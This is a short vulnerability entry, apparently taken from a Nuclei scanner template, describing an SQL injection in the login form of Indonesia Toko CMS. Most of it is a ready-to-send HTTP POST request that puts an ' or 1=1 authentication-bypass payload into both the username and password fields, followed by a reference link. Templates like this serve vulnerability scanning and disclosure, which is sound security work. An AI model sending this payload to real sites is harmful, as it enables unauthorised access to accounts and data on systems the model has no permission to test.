# Nuclei Template: Indonasia Toko CMS - SQL Injection
**Template ID:** indonasia-toko-cms-sql
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`indonasia-toko-cms-sql.yaml`)

## Vulnerability Information & PoC

## Description
Indonesia Toko CMS is susceptible to SQL Injection in its login system, enabling attackers to exploit vulnerabilities and bypass authentication by injecting malicious SQL code.

## Steps to reproduce / Exploit Payload
```http
POST /index.php?mnu=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user=%27+or+1%3D1+limit+1+--+-%2B&pass=%27+or+1%3D1+limit+1+--+-%2B&Login=Login
```

## References
- https://cxsecurity.com/issue/WLB-2019030008
